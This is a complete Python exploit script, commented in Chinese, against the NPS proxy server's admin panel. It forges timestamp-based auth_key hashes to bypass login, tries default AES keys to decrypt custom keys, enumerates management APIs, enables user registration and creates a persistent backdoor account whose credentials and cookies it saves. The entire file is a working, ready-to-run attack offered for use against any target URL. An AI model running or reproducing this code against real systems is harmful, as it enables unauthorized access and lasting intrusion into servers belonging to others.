#!/usr/bin/env python3
"""
NPS登录绕过与持久化攻击完整脚本
版本: 3.0 (集成账户持久化功能)
描述: 针对NPS的登录绕过漏洞，并在20秒窗口期内创建持久化账户
用法: python3 nps_full_exploit.py http://target:port
https://github.com/Domren/POC/
"""

import requests
import time
import hashlib
import json
import sys
import re
import random
import string
from datetime import datetime
from Crypto.Cipher import AES
import binascii
import os

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

class NPSExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        
        # 结果存储
        self.results = {
            'target': self.target,
            'timestamp': int(time.time()),
            'status': 'pending',
            'vulnerability': {},
            'bypass_info': {},
            'persistent_account': {},
            'api_access': {},
            'details': []
        }
        
        # 用户代理随机化
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
    def log(self, message, level="INFO", data=None):
        """统一日志记录"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_msg = f"[{timestamp}] [{level}] {message}"
        
        # 存储到结果
        self.results['details'].append({
            'time': timestamp,
            'level': level,
            'message': message,
            'data': data
        })
        
        # 输出到控制台
        prefix_map = {
            "INFO": "[*]",
            "SUCCESS": "[+]",
            "WARNING": "[!]",
            "ERROR": "[-]",
            "DEBUG": "[DEBUG]"
        }
        prefix = prefix_map.get(level, "[*]")
        print(f"{prefix} {message}")
        
        if data and level == "DEBUG":
            print(f"     数据: {data}")
    
    def random_string(self, length=8):
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def aes_decrypt(self, ciphertext_hex, key_str):
        """AES-CBC解密函数"""
        try:
            ciphertext = binascii.unhexlify(ciphertext_hex)
            
            # 确保密钥是16字节
            if len(key_str) < 16:
                key_str = key_str.ljust(16, '0')
            elif len(key_str) > 16:
                key_str = key_str[:16]
                
            key = key_str.encode('utf-8')
            iv = b'\x00' * 16  # NPS默认IV
            
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext = cipher.decrypt(ciphertext)
            
            # 多种padding处理策略
            try:
                # PKCS7
                padding_len = plaintext[-1]
                if 1 <= padding_len <= 16:
                    plaintext = plaintext[:-padding_len]
            except:
                # 尝试去除常见填充字符
                for pad_char in [b'\x00', b'\x0b', b'\x0c', b'\x0e', b'\x0f', b'\x10']:
                    plaintext = plaintext.rstrip(pad_char)
            
            result = plaintext.decode('utf-8', errors='ignore').strip()
            if result:
                self.log(f"解密成功: '{result}' (密钥: {key_str})", "DEBUG")
            return result
        except Exception as e:
            self.log(f"解密失败: {e}", "DEBUG")
            return None
    
    def probe_configuration(self):
        """探测NPS配置状态"""
        self.log("开始探测目标配置...")
        
        endpoints_to_check = [
            '/auth/getauthkey',
            '/login',
            '/index/index',
            '/'
        ]
        
        for endpoint in endpoints_to_check:
            try:
                url = f"{self.target}{endpoint}"
                headers = {'User-Agent': random.choice(self.user_agents)}
                resp = self.session.get(url, headers=headers)
                
                self.results['vulnerability'][endpoint] = {
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'redirects': len(resp.history)
                }
                
                if endpoint == '/auth/getauthkey' and resp.status_code == 200:
                    try:
                        data = resp.json()
                        crypt_key = data.get('crypt_auth_key', '')
                        
                        self.results['vulnerability']['crypt_auth_key'] = crypt_key
                        self.results['vulnerability']['crypt_type'] = data.get('crypt_type', '')
                        
                        # 判断配置状态
                        if crypt_key == "5acabcf051cd55abca03d18294422e01":
                            self.log("发现默认密文! auth_key被注释", "SUCCESS")
                            self.results['vulnerability']['config_status'] = 'default_commented'
                            return 'default_commented'
                        else:
                            self.log(f"发现自定义密文: {crypt_key[:16]}...", "INFO")
                            self.results['vulnerability']['config_status'] = 'custom'
                            
                            # 尝试解密
                            default_keys = [
                                "1234567812345678",
                                "nps123456789012",
                                "admin1234567890",
                                "1234567890123456",
                                "abcdefgh12345678"
                            ]
                            
                            for key in default_keys:
                                decrypted = self.aes_decrypt(crypt_key, key)
                                if decrypted:
                                    self.log(f"使用默认密钥解密成功: {decrypted}", "SUCCESS")
                                    self.results['vulnerability']['decrypted_key'] = decrypted
                                    self.results['vulnerability']['used_aes_key'] = key
                                    return 'custom_decrypted'
                            
                            return 'custom_unknown'
                    except json.JSONDecodeError:
                        self.log("响应不是有效的JSON", "WARNING")
            except Exception as e:
                self.log(f"探测 {endpoint} 失败: {e}", "DEBUG")
        
        self.results['vulnerability']['config_status'] = 'unknown'
        return 'unknown'
    
    def generate_auth_params(self, timestamp=None, auth_key_str=""):
        """生成认证参数"""
        if timestamp is None:
            timestamp = int(time.time())
        
        algorithms = {}
        timestamp_str = str(timestamp)
        
        # 基础算法
        algorithms['md5_timestamp'] = hashlib.md5(timestamp_str.encode()).hexdigest()
        
        # 如果提供了auth_key
        if auth_key_str:
            # 文章中的主要算法
            algorithms['md5_timestamp_authkey'] = hashlib.md5(
                f"{timestamp_str}{auth_key_str}".encode()
            ).hexdigest()
            
            # 其他可能的算法
            algorithms['md5_authkey_timestamp'] = hashlib.md5(
                f"{auth_key_str}{timestamp_str}".encode()
            ).hexdigest()
            
            algorithms['md5_timestamp_authkey_nps'] = hashlib.md5(
                f"{timestamp_str}{auth_key_str}nps".encode()
            ).hexdigest()
        
        return timestamp, algorithms
    
    def test_bypass(self, timestamp, auth_key_hash, path="/index/index"):
        """测试登录绕过"""
        url = f"{self.target}{path}"
        params = {'auth_key': auth_key_hash, 'timestamp': timestamp}
        
        try:
            headers = {'User-Agent': random.choice(self.user_agents)}
            resp = self.session.get(url, params=params, headers=headers, allow_redirects=False)
            
            # 分析响应
            analysis = {
                'status_code': resp.status_code,
                'content_length': len(resp.text),
                'is_redirect': resp.is_redirect,
                'redirect_location': resp.headers.get('Location', '') if resp.is_redirect else ''
            }
            
            content_lower = resp.text.lower()
            
            # 成功指标
            success_indicators = [
                'dashboard', '控制面板', '客户端列表', '隧道管理',
                'nps', 'server', 'version', 'welcome'
            ]
            
            # 失败指标
            failure_indicators = [
                'login', '登录', 'username', 'password',
                'sign in', '认证', 'auth'
            ]
            
            success_score = sum(10 for indicator in success_indicators if indicator in content_lower)
            failure_score = sum(10 for indicator in failure_indicators if indicator in content_lower)
            
            # 判断逻辑
            if resp.is_redirect:
                location = resp.headers.get('Location', '')
                if 'login' in location.lower():
                    return False, "重定向到登录页", analysis
                else:
                    return True, f"重定向到: {location}", analysis
            
            elif resp.status_code == 200:
                if success_score > failure_score and success_score > 0:
                    return True, f"成功匹配 {success_score//10} 个成功指标", analysis
                elif len(resp.text) > 5000:  # 大型响应可能是管理页面
                    return True, "收到大型HTML响应", analysis
                else:
                    return False, f"未匹配到成功指标 (成功:{success_score//10}, 失败:{failure_score//10})", analysis
            else:
                return False, f"HTTP状态码: {resp.status_code}", analysis
                
        except Exception as e:
            return False, f"请求异常: {e}", {}
    
    def exploit_bypass(self, config_status, decrypted_key=None):
        """执行登录绕过"""
        self.log("开始尝试登录绕过...")
        
        bypass_results = []
        
        # 生成时间戳（考虑时钟偏移）
        base_timestamp = int(time.time())
        timestamps_to_test = [
            base_timestamp,
            base_timestamp - 1,
            base_timestamp + 1,
            base_timestamp - 2,
            base_timestamp + 2,
            base_timestamp - 5,
            base_timestamp + 5
        ]
        
        # 测试路径
        paths_to_test = [
            "/index/index",
            "/",
            "/admin/index",
            "/dashboard",
            "/index/home"
        ]
        
        for ts in timestamps_to_test:
            self.log(f"测试时间戳: {ts}", "DEBUG")
            
            # 根据配置状态生成参数
            if config_status == 'default_commented':
                _, algorithms = self.generate_auth_params(ts)
                auth_hash = algorithms['md5_timestamp']
                algorithm_used = 'md5(timestamp)'
                
            elif config_status == 'custom_decrypted' and decrypted_key:
                _, algorithms = self.generate_auth_params(ts, decrypted_key)
                # 尝试所有算法
                test_hashes = [
                    ('md5_timestamp', algorithms['md5_timestamp']),
                    ('md5_timestamp_authkey', algorithms.get('md5_timestamp_authkey')),
                    ('md5_authkey_timestamp', algorithms.get('md5_authkey_timestamp'))
                ]
            else:
                self.log("配置状态不支持绕过", "ERROR")
                return False, []
            
            # 测试所有路径
            for path in paths_to_test:
                if config_status == 'default_commented':
                    success, message, analysis = self.test_bypass(ts, auth_hash, path)
                    
                    if success:
                        bypass_url = f"{self.target}{path}?auth_key={auth_hash}&timestamp={ts}"
                        bypass_results.append({
                            'url': bypass_url,
                            'timestamp': ts,
                            'algorithm': algorithm_used,
                            'path': path,
                            'analysis': analysis,
                            'message': message
                        })
                        self.log(f"绕过成功! {path} - {message}", "SUCCESS")
                        return True, bypass_results
                
                elif config_status == 'custom_decrypted':
                    for algo_name, auth_hash in test_hashes:
                        if not auth_hash:
                            continue
                        
                        success, message, analysis = self.test_bypass(ts, auth_hash, path)
                        
                        if success:
                            bypass_url = f"{self.target}{path}?auth_key={auth_hash}&timestamp={ts}"
                            bypass_results.append({
                                'url': bypass_url,
                                'timestamp': ts,
                                'algorithm': algo_name,
                                'path': path,
                                'analysis': analysis,
                                'message': message
                            })
                            self.log(f"绕过成功! {path} - {algo_name} - {message}", "SUCCESS")
                            return True, bypass_results
        
        self.log("所有绕过尝试均失败", "WARNING")
        return False, bypass_results
    
    def test_api_access(self, auth_key_hash, timestamp):
        """测试API访问权限"""
        self.log("测试管理API访问权限...")
        
        test_apis = [
            ("/client/list", "POST", "search=&order=asc&offset=0&limit=10"),
            ("/index/getindex", "GET", None),
            ("/index/gettunnel", "POST", "offset=0&limit=10&type=&client_id=1&search="),
            ("/index/getport", "GET", None)
        ]
        
        accessible_apis = []
        
        for endpoint, method, payload in test_apis:
            try:
                url = f"{self.target}{endpoint}?auth_key={auth_key_hash}&timestamp={timestamp}"
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                if method == "POST":
                    resp = self.session.post(url, data=payload, headers=headers)
                else:
                    resp = self.session.get(url, headers=headers)
                
                if resp.status_code == 200:
                    # 尝试解析JSON响应
                    try:
                        json_data = resp.json()
                        accessible_apis.append({
                            'endpoint': endpoint,
                            'method': method,
                            'status': 'accessible',
                            'response_sample': str(json_data)[:200] + "..." if len(str(json_data)) > 200 else str(json_data)
                        })
                        self.log(f"API可访问: {endpoint}", "SUCCESS")
                    except:
                        accessible_apis.append({
                            'endpoint': endpoint,
                            'method': method,
                            'status': 'accessible_non_json'
                        })
                        self.log(f"API可访问(非JSON): {endpoint}", "INFO")
            except Exception as e:
                self.log(f"API测试失败 {endpoint}: {e}", "DEBUG")
        
        self.results['api_access'] = accessible_apis
        return accessible_apis
    
    def create_persistent_account(self, auth_key_hash, timestamp):
        """在20秒窗口期内创建持久化账户"""
        self.log("尝试创建持久化账户...")
        
        # 生成随机账户信息
        rand_suffix = self.random_string(6)
        account_info = {
            'username': f'nps_user_{rand_suffix}',
            'password': f'Nps@2024{rand_suffix}',
            'email': f'nps{rand_suffix}@example.com'
        }
        
        start_time = time.time()
        time_window = 18  # 留2秒余量
        
        self.log(f"账户信息: {account_info['username']}/{account_info['password']}", "INFO")
        self.log(f"时间窗口: {time_window}秒", "INFO")
        
        # 步骤1: 检查注册功能
        self.log("步骤1: 检查注册功能...")
        registration_enabled = self.check_registration_status(auth_key_hash, timestamp)
        
        if registration_enabled:
            self.log("注册功能已开启", "SUCCESS")
        else:
            self.log("注册功能未开启，尝试启用...", "INFO")
            if self.enable_registration(auth_key_hash, timestamp):
                self.log("成功启用注册功能", "SUCCESS")
                registration_enabled = True
            else:
                self.log("无法启用注册功能", "WARNING")
                return False, None
        
        # 检查剩余时间
        elapsed = time.time() - start_time
        if elapsed > time_window:
            self.log(f"时间不足，已用 {elapsed:.1f}秒", "ERROR")
            return False, None
        
        # 步骤2: 注册账户
        self.log("步骤2: 注册新账户...")
        if registration_enabled:
            register_success = self.register_account(account_info, auth_key_hash, timestamp)
            
            if register_success:
                self.log("账户注册成功", "SUCCESS")
            else:
                self.log("账户注册失败", "ERROR")
                return False, None
        
        # 检查剩余时间
        elapsed = time.time() - start_time
        if elapsed > time_window:
            self.log(f"时间不足，已用 {elapsed:.1f}秒", "ERROR")
            return False, None
        
        # 步骤3: 使用新账户登录
        self.log("步骤3: 新账户登录...")
        login_success, session_cookie = self.login_with_account(account_info)
        
        if login_success and session_cookie:
            self.log("新账户登录成功，获得持久会话", "SUCCESS")
            
            # 验证权限
            perm_check = self.verify_account_permissions(session_cookie)
            
            account_result = {
                **account_info,
                'cookie': session_cookie,
                'login_time': int(time.time()),
                'permissions': perm_check
            }
            
            self.results['persistent_account'] = account_result
            return True, account_result
        
        return False, None
    
    def check_registration_status(self, auth_key_hash, timestamp):
        """检查用户注册功能状态"""
        try:
            # 检查首页是否有注册按钮
            url = f"{self.target}/index/index?auth_key={auth_key_hash}&timestamp={timestamp}"
            resp = self.session.get(url)
            
            if '注册' in resp.text or 'register' in resp.text.lower():
                return True
            
            # 尝试直接访问注册页面
            register_urls = [
                f"{self.target}/login/register?auth_key={auth_key_hash}&timestamp={timestamp}",
                f"{self.target}/register?auth_key={auth_key_hash}&timestamp={timestamp}"
            ]
            
            for reg_url in register_urls:
                try:
                    resp = self.session.get(reg_url)
                    if resp.status_code == 200 and ('注册' in resp.text or 'register' in resp.text.lower()):
                        return True
                except:
                    continue
            
            return False
        except Exception as e:
            self.log(f"检查注册状态失败: {e}", "DEBUG")
            return False
    
    def enable_registration(self, auth_key_hash, timestamp):
        """尝试启用注册功能"""
        # 尝试的配置端点
        config_endpoints = [
            "/config/update",
            "/index/updateconfig",
            "/setting/save",
            "/admin/update"
        ]
        
        for endpoint in config_endpoints:
            try:
                url = f"{self.target}{endpoint}?auth_key={auth_key_hash}&timestamp={timestamp}"
                
                # 尝试不同的payload格式
                payloads = [
                    {"allow_user_login": "true", "allow_user_register": "true"},
                    {"AllowUserLogin": "true", "AllowUserRegister": "true"},
                    {"user_login": "true", "user_register": "true"}
                ]
                
                for payload in payloads:
                    resp = self.session.post(url, data=payload)
                    
                    if resp.status_code == 200:
                        # 检查响应
                        if any(word in resp.text.lower() for word in ['success', 'true', 'ok', '成功']):
                            self.log(f"配置修改成功: {endpoint}", "SUCCESS")
                            
                            # 等待配置生效
                            time.sleep(1)
                            
                            # 验证是否生效
                            if self.check_registration_status(auth_key_hash, timestamp):
                                return True
            except Exception as e:
                self.log(f"配置端点 {endpoint} 失败: {e}", "DEBUG")
                continue
        
        return False
    
    def register_account(self, account_info, auth_key_hash, timestamp):
        """注册新账户"""
        register_endpoints = [
            "/login/register",
            "/register",
            "/user/register",
            "/auth/register"
        ]
        
        for endpoint in register_endpoints:
            try:
                url = f"{self.target}{endpoint}?auth_key={auth_key_hash}&timestamp={timestamp}"
                
                # 先GET获取可能的CSRF token
                get_resp = self.session.get(url)
                csrf_token = self.extract_csrf_token(get_resp.text)
                
                # 准备注册数据
                register_data = {
                    "username": account_info['username'],
                    "password": account_info['password'],
                    "confirm_password": account_info['password'],
                    "email": account_info['email']
                }
                
                if csrf_token:
                    register_data["csrf_token"] = csrf_token
                    register_data["_token"] = csrf_token
                
                # 提交注册
                post_resp = self.session.post(url, data=register_data)
                
                if post_resp.status_code == 200:
                    # 检查是否成功
                    success_indicators = [
                        '注册成功', 'success', 'redirect', '登录',
                        'successfully', 'created'
                    ]
                    
                    if any(indicator in post_resp.text.lower() for indicator in success_indicators):
                        self.log(f"注册成功: {endpoint}", "SUCCESS")
                        return True
                    
                    # 检查是否已存在
                    if '已存在' in post_resp.text or 'exists' in post_resp.text.lower():
                        self.log("用户名已存在", "WARNING")
                        return False
            except Exception as e:
                self.log(f"注册端点 {endpoint} 失败: {e}", "DEBUG")
                continue
        
        return False
    
    def login_with_account(self, account_info):
        """使用新账户登录"""
        login_endpoints = [
            "/login/verify",
            "/login/check",
            "/user/login",
            "/auth/login"
        ]
        
        for endpoint in login_endpoints:
            try:
                url = f"{self.target}{endpoint}"
                
                # 创建新的独立session
                user_session = requests.Session()
                user_session.verify = False
                user_session.headers.update({'User-Agent': random.choice(self.user_agents)})
                
                # 登录数据
                login_data = {
                    "username": account_info['username'],
                    "password": account_info['password']
                }
                
                resp = user_session.post(url, data=login_data)
                
                if resp.status_code == 200:
                    # 检查登录成功
                    if 'dashboard' in resp.text.lower() or '客户端' in resp.text:
                        self.log(f"登录成功: {endpoint}", "SUCCESS")
                        
                        # 获取cookie
                        cookies = user_session.cookies.get_dict()
                        
                        # 保存session对象到结果
                        self.results['_user_session'] = user_session
                        
                        return True, cookies
            except Exception as e:
                self.log(f"登录端点 {endpoint} 失败: {e}", "DEBUG")
                continue
        
        return False, None
    
    def verify_account_permissions(self, cookies):
        """验证账户权限"""
        permissions = {
            'admin_pages': False,
            'client_management': False,
            'tunnel_management': False,
            'config_access': False
        }
        
        # 使用保存的session或创建新session
        if hasattr(self, '_user_session'):
            session = self._user_session
        else:
            session = requests.Session()
            session.verify = False
            session.cookies.update(cookies)
        
        # 测试各种权限
        test_urls = [
            ("/index/index", "admin_pages"),
            ("/client/list", "client_management"),
            ("/index/gettunnel", "tunnel_management"),
            ("/config/view", "config_access")
        ]
        
        for url, perm_key in test_urls:
            try:
                full_url = f"{self.target}{url}"
                resp = session.get(full_url, allow_redirects=False)
                
                if resp.status_code == 200:
                    # 检查是否重定向到登录页
                    if resp.is_redirect and 'login' in resp.headers.get('Location', '').lower():
                        permissions[perm_key] = False
                    else:
                        permissions[perm_key] = True
                else:
                    permissions[perm_key] = False
            except:
                permissions[perm_key] = False
        
        return permissions
    
    def extract_csrf_token(self, html):
        """提取CSRF token"""
        patterns = [
            r'name="csrf_token" value="([^"]+)"',
            r'name="_token" value="([^"]+)"',
            r'name="token" value="([^"]+)"',
            r'csrf-token" content="([^"]+)"',
            r'csrf_token["\']?[:\s=]+["\']?([^"\'\s>]+)'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    def run_exploit(self):
        """执行完整的漏洞利用流程"""
        self.log("=" * 60)
        self.log("NPS登录绕过与持久化攻击脚本")
        self.log(f"目标: {self.target}")
        self.log("=" * 60)
        
        # 阶段1: 探测配置
        config_status = self.probe_configuration()
        self.results['vulnerability']['detected_status'] = config_status
        
        if config_status in ['unknown', 'custom_unknown']:
            self.log("无法确定配置状态，尝试继续...", "WARNING")
        
        # 阶段2: 登录绕过
        decrypted_key = self.results['vulnerability'].get('decrypted_key')
        bypass_success, bypass_results = self.exploit_bypass(config_status, decrypted_key)
        
        if not bypass_success:
            self.log("登录绕过失败，攻击终止", "ERROR")
            self.results['status'] = 'bypass_failed'
            return self.results
        
        self.log(f"登录绕过成功! 获得 {len(bypass_results)} 个有效入口", "SUCCESS")
        self.results['bypass_info'] = bypass_results
        self.results['status'] = 'bypass_success'
        
        # 阶段3: API权限测试（使用第一个成功的绕过）
        if bypass_results:
            first_bypass = bypass_results[0]
            auth_hash = first_bypass['url'].split('auth_key=')[1].split('&')[0]
            timestamp = first_bypass['timestamp']
            
            accessible_apis = self.test_api_access(auth_hash, timestamp)
            if accessible_apis:
                self.log(f"可访问 {len(accessible_apis)} 个管理API", "SUCCESS")
        
        # 阶段4: 创建持久化账户（在20秒窗口期内）
        if bypass_results:
            first_bypass = bypass_results[0]
            auth_hash = first_bypass['url'].split('auth_key=')[1].split('&')[0]
            timestamp = first_bypass['timestamp']
            
            # 计算剩余时间
            current_time = int(time.time())
            time_diff = abs(current_time - timestamp)
            
            if time_diff <= 18:  # 留有余地
                self.log(f"剩余时间窗口: {20 - time_diff}秒，尝试创建持久账户...", "INFO")
                account_success, account_info = self.create_persistent_account(auth_hash, timestamp)
                
                if account_success:
                    self.log("持久化账户创建成功!", "SUCCESS")
                    self.results['status'] = 'full_success'
                    self.results['persistent_account'] = account_info
                else:
                    self.log("持久化账户创建失败，但绕过仍然有效", "WARNING")
            else:
                self.log("时间窗口已过，无法创建持久账户", "WARNING")
        
        # 保存结果
        self.save_results()
        
        return self.results
    
    def save_results(self):
        """保存结果到文件"""
        filename = f"nps_exploit_{int(time.time())}.json"
        
        # 清理数据（移除不可序列化的对象）
        results_copy = self.results.copy()
        if '_user_session' in results_copy:
            del results_copy['_user_session']
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results_copy, f, indent=2, ensure_ascii=False)
            self.log(f"详细结果已保存到: {filename}", "INFO")
        except Exception as e:
            self.log(f"保存结果失败: {e}", "ERROR")
        
        # 同时保存简明的文本报告
        txt_filename = f"nps_exploit_{int(time.time())}.txt"
        try:
            with open(txt_filename, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("NPS漏洞利用报告\n")
                f.write(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"目标: {self.target}\n")
                f.write("=" * 60 + "\n\n")
                
                f.write("1. 漏洞状态:\n")
                f.write(f"   配置状态: {self.results['vulnerability'].get('config_status', 'unknown')}\n")
                f.write(f"   绕过成功: {self.results['status']}\n\n")
                
                if self.results['bypass_info']:
                    f.write("2. 可用绕过URL:\n")
                    for i, bypass in enumerate(self.results['bypass_info'], 1):
                        f.write(f"   {i}. {bypass['url']}\n")
                        f.write(f"      算法: {bypass.get('algorithm', 'unknown')}\n")
                        f.write(f"      路径: {bypass.get('path', 'unknown')}\n\n")
                
                if self.results.get('persistent_account'):
                    f.write("3. 持久化账户:\n")
                    acc = self.results['persistent_account']
                    f.write(f"   用户名: {acc.get('username')}\n")
                    f.write(f"   密码: {acc.get('password')}\n")
                    f.write(f"   Cookie: {acc.get('cookie', {})}\n\n")
                
                f.write("4. API访问权限:\n")
                for api in self.results.get('api_access', []):
                    f.write(f"   - {api['endpoint']} ({api['method']}): {api['status']}\n")
            
            self.log(f"文本报告已保存到: {txt_filename}", "INFO")
        except Exception as e:
            self.log(f"保存文本报告失败: {e}", "ERROR")
    
    def print_summary(self):
        """打印结果摘要"""
        print("\n" + "=" * 60)
        print("攻击结果摘要")
        print("=" * 60)
        
        status = self.results['status']
        status_map = {
            'full_success': '✅ 完全成功 (绕过+持久账户)',
            'bypass_success': '⚠️ 部分成功 (仅绕过登录)',
            'bypass_failed': '❌ 失败'
        }
        
        print(f"总体状态: {status_map.get(status, status)}")
        
        if self.results['bypass_info']:
            print(f"\n绕过URL (第一个):")
            print(f"  {self.results['bypass_info'][0]['url']}")
            print(f"  有效期: 约{20 - (int(time.time()) - self.results['bypass_info'][0]['timestamp'])}秒")
        
        if self.results.get('persistent_account'):
            acc = self.results['persistent_account']
            print(f"\n持久化账户:")
            print(f"  用户名: {acc.get('username')}")
            print(f"  密码: {acc.get('password')}")
            print(f"  权限: {', '.join([k for k, v in acc.get('permissions', {}).items() if v])}")
        
        print(f"\n详细报告已保存到JSON和TXT文件")
        print("=" * 60)

def main():
    if len(sys.argv) < 2:
        print("使用方法:")
        print(f"  {sys.argv[0]} <目标URL>")
        print("\n示例:")
        print(f"  {sys.argv[0]} http://192.168.1.100:8080")
        print(f"  {sys.argv[0]} https://target.com:8443")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # 验证URL格式
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    try:
        # 创建并运行漏洞利用
        exploit = NPSExploit(target)
        results = exploit.run_exploit()
        
        # 打印摘要
        exploit.print_summary()
        
        # 如果是完全成功，提供使用提示
        if results['status'] == 'full_success' and results.get('persistent_account'):
            print("\n使用提示:")
            print("1. 使用持久化账户登录:")
            print(f"   用户名: {results['persistent_account']['username']}")
            print(f"   密码: {results['persistent_account']['password']}")
            print("\n2. 或者使用Cookie直接访问:")
            cookies = results['persistent_account'].get('cookie', {})
            if cookies:
                cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
                print(f"   Cookie: {cookie_str}")
        
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] 错误: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
